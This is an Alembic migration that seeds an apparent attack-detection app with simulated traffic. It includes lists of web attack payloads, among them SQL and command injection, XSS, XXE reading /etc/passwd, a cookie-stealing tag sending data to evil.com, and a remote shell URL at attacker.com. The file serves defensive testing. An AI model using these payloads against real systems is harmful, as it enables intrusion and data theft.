"""Add attack simulation seed data
Revision ID: 296c754dec69
Revises: 81747df8dbf3
Create Date: 2024-11-24 02:50:43.019195
"""

from typing import Sequence, Union
from alembic import op
import sqlalchemy as sa
from sqlalchemy.sql import table, column
from datetime import datetime, timedelta
import random
from enum import Enum
from zoneinfo import ZoneInfo

# revision identifiers, used by Alembic.
revision: str = "296c754dec69"
down_revision: Union[str, None] = "81747df8dbf3"
branch_labels: Union[str, Sequence[str], None] = None
depends_on: Union[str, Sequence[str], None] = None

class AttackType(str, Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    CSRF = "csrf"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    XXE_INJECTION = "xxe_injection"
    SSRF = "ssrf"
    LDAP_INJECTION = "ldap_injection"
    CODE_INJECTION = "code_injection"
    DOS = "denial_of_service"
    BUFFER_OVERFLOW = "buffer_overflow"
    HTTP_HEADER_INJECTION = "http_header_injection"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    SESSION_FIXATION = "session_fixation"
    CLICKJACKING = "clickjacking"
    PHISHING = "phishing"
    NORMAL = "normal"
    UNKNOWN = "unknown"


class AttackPatterns:
    SQL_INJECTION = [
        "' OR '1'='1",
        "UNION SELECT * FROM users",
        "1'; DROP TABLE users--",
    ]

    XSS = [
        "<script>alert('xss')</script>",
        "<img src='x' onerror='alert(1)'>",
        "javascript:alert(1)",
        "<svg/onload=alert(1)>",
        "'-alert(1)-'",
    ]

    NOSQL_INJECTION = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(1000)"}',
        '{"password": {"$regex": "^a"}}',
    ]

    COMMAND_INJECTION = [
        "; cat /etc/passwd",
        "|| dir",
        "& ping -i 30 127.0.0.1 &",
        "`curl evil.com`",
    ]

    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
    ]
    
    CSRF = [
        "<img src='http://evil.com/steal?cookie=' + document.cookie>",
        "<form action='http://evil.com'>",
    ]

    LFI = [
        "../../../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]

    RFI = [
        "http://evil.com/malicious.php",
        "https://attacker.com/shell.php",
    ]

    XXE_INJECTION = [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>',
        '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]>',
    ]

    SSRF = [
        "http://localhost:8080/admin",
        "file:///etc/passwd",
    ]


def generate_legitimate_input():
    """Generate realistic non-malicious form inputs"""
    usernames = [
        "john.doe",
        "sarah.smith",
        "tech_lover92",
        "mountain_hiker",
        "coffee_addict",
        "python_dev",
        "web_designer",
        "data_wizard",
        "photo_enthusiast",
        "music_lover_23",
    ]

    email_domains = [
        "gmail.com",
        "yahoo.com",
        "hotmail.com",
        "outlook.com",
        "proton.me",
    ]

    comments = [
        "Great product! Would recommend.",
        "When will this be back in stock?",
        "How can I contact support?",
        "Please update my shipping address.",
        "Thanks for the quick delivery!",
    ]

    form_types = [
        ("username", lambda: random.choice(usernames)),
        ("email", lambda: f"{random.choice(usernames)}@{random.choice(email_domains)}"),
        ("comment", lambda: random.choice(comments)),
    ]

    input_type, generator = random.choice(form_types)
    return generator(), input_type


def create_sample_messages(domain: str, num_messages: int = 1000) -> list:
    messages = []

    attack_patterns = {
        "sql_injection": AttackPatterns.SQL_INJECTION,
        "xss": AttackPatterns.XSS,
        "nosql_injection": AttackPatterns.NOSQL_INJECTION,
        "command_injection": AttackPatterns.COMMAND_INJECTION,
        "path_traversal": AttackPatterns.PATH_TRAVERSAL,
        "csrf": AttackPatterns.CSRF,
        "local_file_inclusion": AttackPatterns.LFI,
        "remote_file_inclusion": AttackPatterns.RFI,
        "xxe_injection": AttackPatterns.XXE_INJECTION,
        "ssrf": AttackPatterns.SSRF,
    }

    # Generate messages with timestamps spanning the last 24 hours
    end_time = datetime.now(ZoneInfo("UTC"))
    start_time = end_time - timedelta(hours=24)

    for _ in range(num_messages):
        # 70% legitimate traffic, 30% attacks
        is_attack = random.random() < 0.3

        if is_attack:
            # Choose random attack type and pattern
            attack_type = random.choice(list(attack_patterns.keys()))
            message_text = random.choice(attack_patterns[attack_type])
            is_malicious = True
            # 80% chance of blocking malicious traffic
            caused_block = random.random() < 0.8
            # Higher confidence for malicious traffic
            confidence_score = random.uniform(0.7, 0.99) if caused_block else random.uniform(0.5, 0.7)
        else:
            # Generate legitimate form input
            message_text, input_type = generate_legitimate_input()
            is_malicious = False
            caused_block = False
            # Lower confidence for legitimate traffic
            confidence_score = random.uniform(0.8, 1)

        # Generate random timestamp within the last 24 hours
        random_seconds = random.randint(0, int((end_time - start_time).total_seconds()))
        timestamp = start_time + timedelta(seconds=random_seconds)

        # Generate more varied IP addresses
        ip_first_octet = random.choice([10, 172, 192])
        ip_address = f"{ip_first_octet}.{random.randint(1, 254)}"

        messages.append(
            {
                "domain": domain,
                "ip_address": ip_address,
                "message": message_text,
                "type": random.choice(list(AttackType)).value,
                "is_malicious": is_malicious,
                "caused_block": caused_block,
                "created_at": timestamp,
                "blocked_at": timestamp if caused_block else None,
                "confidence_score": confidence_score,
            }
        )

    return messages


def upgrade():
    # Define test domains
    test_domains = ["example.com", "test.com"]

    # Check and insert domains if they don't exist
    for domain in test_domains:
        op.execute(
            f"""
            INSERT INTO customers (domain)
            SELECT '{domain}'
            WHERE NOT EXISTS (
                SELECT 1 FROM customers WHERE domain = '{domain}'
            );
            """
        )

    # Create reference table for text_messages for bulk insert
    text_messages = table(
        "text_messages",
        column("id", sa.Integer),
        column("domain", sa.String),
        column("ip_address", sa.String),
        column("message", sa.String),
        column("type", sa.String),
        column("is_malicious", sa.Boolean),
        column("caused_block", sa.Boolean),
        column("created_at", sa.DateTime),
        column("blocked_at", sa.DateTime),
        column("confidence_score", sa.Float),
    )

    # Generate and insert attack simulation data
    for domain in test_domains:
        messages = create_sample_messages(
            domain, num_messages=500
        )  # 500 messages per domain
        op.bulk_insert(text_messages, messages)
